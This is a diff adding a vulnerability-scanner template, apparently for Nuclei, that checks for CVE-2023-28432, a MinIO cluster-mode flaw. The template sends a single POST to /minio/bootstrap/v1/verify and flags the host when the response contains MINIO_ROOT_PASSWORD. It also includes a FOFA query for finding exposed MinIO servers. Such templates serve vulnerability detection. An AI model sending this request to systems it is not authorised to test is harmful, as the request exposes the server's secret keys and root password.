@@ -1,0 +1,46 @@
+id: CVE-2023-28432
+info:
+  name: MinIO集群模式信息泄露漏洞（CVE-2023-28432）
+  author: mike
+  severity: info
+  description: MinIO是一个开源对象存储系统。在其RELEASE.2023-03-20T20-16-18Z版本（不含）以前，集群模式部署下存在一处信息泄露漏洞，攻击者可以通过发送一个POST数据包获取进程所有的环境变量，其中就包含账号密码MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD。
+  reference: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: banner="MinIO" || header="MinIO" || title="MinIO Browser"
+http:
+  - raw:
+      - |
+        POST /minio/bootstrap/v1/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded
+        Upgrade-Insecure-Requests: 1
+
+      # - |
+      #   GET /login HTTP/1.1
+      #   Host: {{Hostname}}
+      #   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+      #   Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        part: header_1
+        status:
+          - 200
+      - type: word
+        part: body_1
+        words:
+          - "MINIO_ROOT_PASSWORD"
+
+      # - type: word
+      #   part: body_2
+      #   words:
+      #     - "MinIO Console"
